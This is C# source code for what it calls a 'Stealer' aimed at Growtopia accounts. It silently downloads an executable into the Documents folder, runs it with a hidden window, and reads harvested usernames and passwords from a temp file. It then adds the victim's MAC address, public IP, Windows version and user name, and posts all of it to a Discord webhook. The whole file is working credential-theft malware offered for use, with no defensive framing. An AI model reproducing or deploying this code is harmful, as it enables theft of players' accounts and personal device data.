
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace pherialfuckingstubb
{
    class Program
    {
        static string filepath = "";
        static string d = System.IO.Path.GetTempPath();

        static string webhookurl = "webhookurl";

        static string GetLine(string text, int lineNo)
        {
            string[] lines = text.Replace("\r", "").Split('\n');
            return lines.Length >= lineNo ? lines[lineNo - 1] : null;
        }
        static string GetMACAddress()
        {
            string macAddresses = "";
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                // Only consider Ethernet network interfaces, thereby ignoring any
                // loopback devices etc.
                if (nic.NetworkInterfaceType != NetworkInterfaceType.Ethernet) continue;
                if (nic.OperationalStatus == OperationalStatus.Up)
                {
                    macAddresses += nic.GetPhysicalAddress().ToString();
                    break;
                }
            }
            return macAddresses;
        }
        static string GetIPAddress()
        {
            String address = "";
            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
            using (WebResponse response = request.GetResponse())
            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
            {
                address = stream.ReadToEnd();
            }

            int first = address.IndexOf("Address: ") + 9;
            int last = address.LastIndexOf("</body>");
            address = address.Substring(first, last - first);

            return address;
        }
        static void Main(string[] args)
        {
            if (filepath == "")
            {
                filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\non.exe";
            }

            using (WebClient a = new WebClient())
            {
                a.DownloadFile("savedecrypter.exe upload to discord i recommend", filepath);
                Process.Start(new ProcessStartInfo
                {
                    FileName = filepath,
                    CreateNoWindow = true,
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                Thread.Sleep(252);
                if (File.Exists(d + "\\pwdtemp"))
                {
                    WebClient web = new WebClient();
                    string mesajxd1 = @"{
  ""embeds"": [
    {
                        ""title"": ""New Growtopia Account from DYTRYRTGHFG"",
      ""description"": ""**Username**: `KJTRJREYJK`\n**Password**: `RJETJKETRK`\n**Mac Address**: `LRTJKERTJ`\n**Ip Address**: `JTKYRJKYTRJKTYK`\n**OS**: `RJTKRETJJEKRT`\n**Windows Version**: `JKRTKJREJTK`\n\n"",
      ""footer"": {
                            ""text"": ""--""
      }
                    }
  ],
  ""username"": ""Stealer""
}
                ";
                    string all = File.ReadAllText(d + "\\pwdtemp");
                    string username = GetLine(all, 1).Replace("Username:","");
                    string password = GetLine(all, 2).Replace("Password:", "");
                    string Version = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion", "ProductName", null);
                    string releaseId = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ReleaseId", "").ToString();
                    byte[] buffer1 = Encoding.UTF8.GetBytes(mesajxd1.Replace("KJTRJREYJK", username).Replace("RJETJKETRK", password).Replace("LRTJKERTJ", GetMACAddress()).Replace("JTKYRJKYTRJKTYK", GetIPAddress()).Replace("JKRTKJREJTK", releaseId).Replace("DYTRYRTGHFG", Environment.UserName).Replace("RJTKRETJJEKRT", Version));
                    ByteArrayContent byteContent1 = new ByteArrayContent(buffer1);
                    byteContent1.Headers.ContentType = new MediaTypeHeaderValue("application/json");
                    HttpClient Client1 = new HttpClient();
                    HttpResponseMessage httpResponce1 = Client1.PostAsync(webhookurl, byteContent1).Result;
                    Task.WaitAll();
                }
            }
        }
    }
}
